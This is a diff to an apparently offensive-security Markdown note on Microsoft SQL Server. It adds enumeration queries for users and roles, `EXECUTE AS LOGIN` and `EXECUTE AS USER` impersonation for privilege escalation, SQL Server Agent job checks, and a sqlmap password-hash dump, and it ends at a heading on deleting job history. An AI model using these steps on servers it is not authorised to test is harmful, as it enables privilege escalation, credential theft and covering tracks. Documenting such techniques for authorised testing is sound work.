@@ -120,6 +120,7 @@ query syntax.
 | MSSQL version | `SELECT @@version` |
 | Current database username | `SELECT USER_NAME()` <br><br> `SELECT CURRENT_USER` |
 | Current logged in account | `SELECT SYSTEM_USER` |
+| List the users in the current database | `SELECT name, create_date, modify_date, type_desc, authentication_type_desc FROM sys.database_principals ORDER BY create_date DESC` |
 | Users' passwords | Using `sqlmap`: <br> `sqlmap -D master -T sys.sql_logins --dump [...]` |
 | Current database | `SELECT DB_NAME()` |
 | Databases | `SELECT name FROM master.sys.databases` |
@@ -202,26 +203,29 @@ SELECT CURRENT_USER
 SELECT SYSTEM_USER
 SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
 
--- Is the current user sysadmin or serveradmin
+-- Is the current user sysadmin or serveradmin.
 SELECT IS_SRVROLEMEMBER('sysadmin')
 SELECT IS_SRVROLEMEMBER('serveradmin')
 
--- Is the specified user (login name) sysadmin or serveradmin
+-- Is the specified user (login name) sysadmin or serveradmin.
 SELECT IS_SRVROLEMEMBER('sysadmin', '<USERNAME>')
 SELECT IS_SRVROLEMEMBER('serveradmin', '<USERNAME>')
 
--- List specified user's fixed-database roles
+-- Lists the specified user's fixed-database roles.
 SELECT u.name, r.name FROM sys.database_role_members AS m INNER JOIN sys.database_principals AS r ON m.role_principal_id = r.principal_id INNER JOIN sys.database_principals AS u ON u.principal_id = m.member_principal_id WHERE u.name = '<USERNAME>';
 
--- List current users permissions
+-- Lists the current users permissions.
 SELECT entity_name, permission_name FROM sys.fn_my_permissions(NULL, NULL)
 
--- List users with the sysadmin role
+-- Lists the users with the sysadmin role.
 exec sp_helpsrvrolemember @srvrolename='sysadmin'
 SELECT 'Name' = sp.NAME,sp.is_disabled AS [Is_disabled] FROM sys.server_role_members rm inner join sys.server_principals sp on rm.member_principal_id = sp.principal_id WHERE rm.role_principal_id = SUSER_ID('sysadmin')
 
--- List users with the sysadmin role or "Control Server" permission
+-- Lists the users with the sysadmin role or "Control Server" permission
 SELECT DISTINCT p.name AS [loginname], p.type, p.type_desc, p.is_disabled, s.sysadmin, CONVERT(VARCHAR(10), p.create_date ,101) AS [created],CONVERT(VARCHAR(10), p.modify_date, 101) AS [update] FROM sys.server_principals p JOIN sys.syslogins s ON p.sid = s.sid JOIN sys.server_permissions sp ON p.principal_id = sp.grantee_principal_id WHERE p.type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN', 'WINDOWS_GROUP') AND p.name NOT LIKE '##%' AND (s.sysadmin = 1 OR sp.permission_name = 'CONTROL SERVER') ORDER BY p.name
+
+-- Lists the users' fixed-database role(s) in the current database.
+SELECT db_name(), r.[name], p.[name] FROM sys.database_role_members m JOIN sys.database_principals r ON m.role_principal_id = r.principal_id JOIN sys.database_principals p ON m.member_principal_id = p.principal_id;
 ```
 
 ###### IMPERSONATE permission
@@ -233,7 +237,10 @@ user he is allowed to impersonate, resulting in a potential elevation of
 privileges.    
 
 This permission is implied for the `sysadmin` role for all databases, and
-the `db_owner` role members in databases that they own.
+the `db_owner` role members in databases that they own. Indeed, impersonation
+of a login (`EXECUTE AS LOGIN`) grants server level permissions (of the
+impersonated login) while the impersonation of an user (`EXECUTE AS USER`) only
+grant permissions at the database level.
 
 The following queries can be used to exploit the `IMPERSONATE` permission:
 
@@ -241,8 +248,12 @@ The following queries can be used to exploit the `IMPERSONATE` permission:
 -- List the SQL Server logins that can be impersonated by the current user
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 
--- Swith the execution context of the session to the specified user. Requires the IMPERSONATE permission on the specified user.
-EXECUTE AS LOGIN = '<USERNAME>'
+-- Swith the execution context of the session to the specified login. Requires the IMPERSONATE permission on the specified login.
+EXECUTE AS LOGIN = '<LOGIN>';
+EXECUTE AS LOGIN = '<DOMAIN>\\<LOGIN>';
+
+-- Swith the execution context in the database to the specified user. Requires the IMPERSONATE permission on the specified user.
+EXECUTE AS USER = '<USER>';
 ```
 
 The `Metasploit`'s `auxiliary/admin/mssql/mssql_escalate_execute_as` module and
@@ -749,8 +760,8 @@ tasks, denominated `SQL Server Agent jobs`. `SQL Server Agent` is available is
 all versions of `SQL server`, except `SQL Server Express`, **but is disabled by
 default**.
 
-In order to fulfil its function, the `SQL Server Agent` service must be run
-using an account having the `sysadmin` fixed server role in `SQL Server` as
+In order to fulfil its function, the `SQL Server Agent` Windows service must be
+run using an account having the `sysadmin` fixed server role in `SQL Server` as
 well as the following Windows privileges: `SeServiceLogonRight`,
 `SeAssignPrimaryTokenPrivilege`, `SeChangeNotifyPrivilege`, and
 `SeIncreaseQuotaPrivilege`.
@@ -759,9 +770,9 @@ The `SQL Server Agent jobs` can be executed:
   - through a `SQL Agent schedule`, for example at a recurring interval or at a
     specific timestamp. A job can be associated with multiple schedules, and
     reciprocally, a schedule can dictate the execution of multiple jobs.
-  - upon the triggering of a `SQL Agent alert`, in response to an event such as
-    another job execution or the reaching of a system resources usage
-    threshold.
+  - upon the triggering of a `SQL Agent alert`, for example in response to an
+    event such as another job execution or the reaching of a system resources
+    usage threshold.
   - **directly by executing the `sp_start_job` stored procedure.**
 
 A `SQL Server Agent job` is composed of (at least) one or multiple steps, each
@@ -787,24 +798,33 @@ governed by the following fixed database roles:
 | `SQLAgentReaderRole` | `msdb` database fixed-database role. | Includes the permissions of the `SQLAgentUserRole` role. <br><br> Can additionally enumerate and view the properties / history of all local or multi-servers jobs. |
 | `SQLAgentOperatorRole` | `msdb` database fixed-database role. | Includes the permissions of the `SQLAgentUserRole` and `SQLAgentReaderRole` roles. <br><br> Can additionally execute, stop, and enable / disable all local jobs and their job history. <br><br> Cannot however modify or delete jobs they don't own (nor make use of multi-servers jobs). |
 
+###### Verify prerequisites
+
+In order to execute `SQL Server Agent jobs`:
+  - the `SQL Server Agent` Windows service must be running.
+  - the current user must have sufficient privileges.
+
+```
+# Checks whether the SQL Server Agent Windows service is running or not.
+SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE  dss.[servicename] LIKE N'SQL Server Agent (%';"
+
+
+SELECT IS_SRVROLEMEMBER('sysadmin', '<USERNAME>')
+EXEC sp_helprolemember 'SQLAgentUserRole';
+EXEC sp_helprolemember 'SQLAgentReaderRole';
+EXEC sp_helprolemember 'SQLAgentOperatorRole';
+```
+
+###### SQL Server Agent jobs enumeration
+
+```
+# Lists the defined MSSQL jobs.
+SELECT job_id, [name] FROM msdb.dbo.sysjobs;
+```
+
 https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189237(v=sql.105)
 https://docs.microsoft.com/fr-fr/sql/ssms/agent/create-an-activex-script-job-step?view=sql-server-2016
 https://www.mssqltips.com/sqlservertip/2014/replace-xpcmdshell-command-line-use-with-sql-server-agent/
-
-By default, the `SQL Server Agent jobs` will be
-executed in the security context of the `SQL Server Agent` service account. It
-is however possible to define `proxy accounts` to execute the jobs under a
-different identity.
-
-```
-# Checks if the MSSQL Server Agent service is running.
-SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE  dss.[servicename] LIKE N'SQL Server Agent (%';"
-
-# Lists the defined MSSQL jobs.
-SELECT job_id, [name] FROM msdb.dbo.sysjobs;
-
-SELECT IS_SRVROLEMEMBER('SQLAgentOperatorRole', '<USERNAME>')
-```
 
 Delete job history:
 
